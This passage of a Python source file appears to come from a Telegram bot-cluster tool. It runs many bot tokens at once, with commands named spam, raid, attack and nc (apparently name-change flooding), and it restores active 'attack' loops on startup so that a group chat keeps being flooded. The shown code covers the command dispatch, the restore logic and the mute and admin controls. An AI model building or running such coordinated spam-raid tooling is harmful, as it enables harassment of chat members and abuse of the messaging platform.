        lines = ["❌ Failed!", "💡 Kisi bot ke paas 'Add Admins' right nahi hai."]
        await update.message.reply_text(make_card("Promotion Failed", lines))


async def demote_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE, args):
    user_id = None
    if update.message.reply_to_message:
        user_id = update.message.reply_to_message.from_user.id
    elif args and args[0].lstrip('-').isdigit():
        user_id = int(args[0])

    if not user_id:
        lines = ["❌ Target nahi mila!", "💡 Usage: /demote <user_id> ya reply karo"]
        await update.message.reply_text(make_card("Demote Info", lines))
        return

    chat_id = update.effective_chat.id
    success = False
    for bot_info in controller.bots:
        try:
            await bot_info['bot'].promote_chat_member(
                chat_id=chat_id, user_id=user_id, can_change_info=False,
                can_post_messages=False, can_edit_messages=False, can_delete_messages=False,
                can_invite_users=False, can_restrict_members=False, can_pin_messages=False,
                can_promote_members=False, can_manage_video_chats=False, can_manage_topics=False
            )
            success = True
            break
        except:
            pass

    if success:
        lines = [f"👤 User: {to_fancy(user_id)}", "🚫 Demoted in current GC"]
        await update.message.reply_text(make_card("Demotion Executed", lines))
    else:
        lines = ["❌ Failed!", "💡 Kisi bot ke paas admin rights nahi hain."]
        await update.message.reply_text(make_card("Demotion Failed", lines))


async def mute_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE, args):
    user_id = None
    if update.message.reply_to_message:
        user_id = update.message.reply_to_message.from_user.id
    elif args and args[0].lstrip('-').isdigit():
        user_id = int(args[0])
    if not user_id:
        await update.message.reply_text(make_card("Mute Info", ["💡 Usage: mute <user_id> ya user ko reply karo"]))
        return
    db.add_muted(update.effective_chat.id, user_id)
    permissions = ChatPermissions(can_send_messages=False, can_send_media_messages=False, can_send_polls=False, can_send_other_messages=False, can_add_web_page_previews=False, can_change_info=False, can_invite_users=False, can_pin_messages=False)
    for bot_info in controller.bots:
        try: await bot_info['bot'].restrict_chat_member(update.effective_chat.id, user_id, permissions)
        except: pass
    await update.message.reply_text(make_card("Mute Executed", [f"User: {user_id}", "Muted in current chat"]))


async def unmute_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE, args):
    user_id = None
    if update.message.reply_to_message:
        user_id = update.message.reply_to_message.from_user.id
    elif args and args[0].lstrip('-').isdigit():
        user_id = int(args[0])
    if not user_id:
        await update.message.reply_text(make_card("Unmute Info", ["💡 Usage: unmute <user_id> ya user ko reply karo"]))
        return
    db.remove_muted(update.effective_chat.id, user_id)
    permissions = ChatPermissions(can_send_messages=True, can_send_media_messages=True, can_send_polls=True, can_send_other_messages=True, can_add_web_page_previews=True, can_change_info=True, can_invite_users=True, can_pin_messages=True)
    for bot_info in controller.bots:
        try: await bot_info['bot'].restrict_chat_member(update.effective_chat.id, user_id, permissions)
        except: pass
    await update.message.reply_text(make_card("Unmute Executed", [f"User: {user_id}", "Unmuted in current chat"]))


async def stop_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE, args):
    chat_id = update.effective_chat.id
    controller.stop_chat(chat_id)
    await update.message.reply_text(make_card("Operations Stopped", [f"Chat: {chat_id}", f"Status: Halted", f"Tasks: Cleaned from memory"]))


async def stopall_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE, args):
    controller.stop_all()
    await update.message.reply_text(make_card("Cluster Terminated", [f"Scope: Cluster-Wide", f"Status: All tasks aborted", f"Fleet: Idle"]))


async def speed_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE, args):
    if not args:
        await update.message.reply_text(make_card("Engine Speed", [f"Current Speed: {controller.speed}s"]))
        return
    try:
        speed = float(args[0])
        controller.speed = speed
        db.save_setting("speed", speed)
        await update.message.reply_text(make_card("Engine Speed", [f"Updated Speed: {speed}s"]))
    except:
        await update.message.reply_text(make_card("Speed Error", ["❌ Invalid speed number"]))


async def pre_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE, args):
    if not args:
        await update.message.reply_text(make_card("Prefix Info", [f"Current Prefix: {controller.prefix}"]))
        return
    new_prefix = args[0][0]
    if new_prefix.isalnum():
        await update.message.reply_text(make_card("Prefix Error", ["❌ Prefix must be a symbol like / . ! # etc."]))
        return
    controller.prefix = new_prefix
    db.save_setting("prefix", new_prefix)
    await update.message.reply_text(make_card("Prefix Updated", [f"Active Prefix: {new_prefix}"]))


COMMANDS = {
    "start": start_cmd, "nc": nc_cmd, "spam": spam_cmd, "tspam": tspam_cmd, "raid": raid_cmd,
    "sync": sync_cmd, "slide": slide_cmd, "attack": attack_cmd, "ping": ping_cmd, "status": status_cmd,
    "stats": stats_cmd, "pre": pre_cmd, "add": add_cmd, "rm": rm_cmd, "stop": stop_cmd, "stopall": stopall_cmd,
    "speed": speed_cmd, "dadd": dadd_cmd, "leave": leave_cmd, "promote": promote_cmd, "demote": demote_cmd,
    "mute": mute_cmd, "unmute": unmute_cmd,
}


async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message or not update.message.text: return
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    if db.is_muted(chat_id, user_id) and not update.message.text.startswith(controller.prefix):
        for bot_info in controller.bots:
            try:
                await bot_info['bot'].delete_message(chat_id, update.message.message_id)
                break
            except: continue
        return
    text = update.message.text.strip()
    if not text.startswith(controller.prefix): return
    rest = text[len(controller.prefix):].strip()
    if not rest: return
    parts = rest.split()
    cmd = parts[0].lower()
    args = parts[1:]
    if cmd not in COMMANDS: return
    if not controller.is_admin(user_id):
        await update.message.reply_text(make_card("Security Barrier", ["❌ Access Denied - Admin Rights Required"]))
        return
    try: await COMMANDS[cmd](update, context, args)
    except Exception as e: logger.error(f"Error executing {cmd}: {e}")


# ==================== RESTORE & MAIN ====================
async def restore_attacks():
    active = db.get_active()
    if not active: return
    logger.info(to_fancy(f"🔄 Restoring {len(active)} operations..."))
    total_bots = len(controller.bots)
    for chat_id, target, attack_type in active:
        controller.attacks[chat_id] = {}
        controller.stop_flags[chat_id] = {}
        if attack_type == "nc":
            for idx, bot_info in enumerate(controller.bots):
                task_id = f"{bot_info['id']}_restore_{int(time.time())}_{idx}_nc"
                controller.stop_flags[chat_id][task_id] = False
                task = asyncio.create_task(nc_loop(bot_info['bot'], chat_id, target, task_id, idx, total_bots, DEFAULT_NC_EMOJIS, "both"))
                controller.attacks[chat_id][task_id] = task
        elif attack_type == "spam":
            for idx, bot_info in enumerate(controller.bots):
                task_id = f"{bot_info['id']}_restore_{int(time.time())}_{idx}_spam"
                controller.stop_flags[chat_id][task_id] = False
                task = asyncio.create_task(spam_loop(bot_info['bot'], chat_id, target, task_id, idx, total_bots, ALL_SPAM_TEMPLATES))
                controller.attacks[chat_id][task_id] = task


async def main():
    print("=" * 60)
    print(to_fancy(f"{REBRAND} Matrix Cluster - Online (24/7 Staggered Flow)"))
    print("=" * 60)
    valid_tokens = [t.strip() for t in TOKENS if t.strip() and len(t) > 10]
    for idx, token in enumerate(valid_tokens):
        try:
            app = Application.builder().token(token).build()
            bot_info = await asyncio.wait_for(app.bot.get_me(), timeout=10)
            app.add_handler(MessageHandler(filters.TEXT | filters.COMMAND, handle_message))
            app.add_error_handler(lambda update, context: logger.error(f"Telegram Error: {context.error}"))
            await app.initialize()
            await app.start()
            if app.updater: await app.updater.start_polling()

            controller.bots.append({'id': bot_info.id, 'username': bot_info.username, 'bot': app.bot, 'app': app})
            print(to_fancy(f"✅ Bot #{idx+1} Online: @{bot_info.username}"))
        except Exception as e: print(to_fancy(f"❌ Bot #{idx+1} Failed: {str(e)[:30]}"))
    print("=" * 60)
    print(to_fancy(f"🚀 {REBRAND} Cluster Ready: {len(controller.bots)} Bots Operational"))
    print(to_fancy(f"Prefix: {controller.prefix}"))
    print("=" * 60)
    await restore_attacks()
    while True: await asyncio.sleep(60)


def run_bot():
    """Entry point — called by cli.py after wizard."""
    keep_alive()
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(to_fancy("\n🛑 Stopped"))
        controller.stop_all()
    except Exception as e:
        print(to_fancy(f"❌ Error: {e}"))


def signal_handler(sig, frame):
    print(to_fancy("\n🛑 Shutting down cluster gracefully..."))
    controller.stop_all()
    sys.exit(0)


signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)


if __name__ == "__main__":
    run_bot()
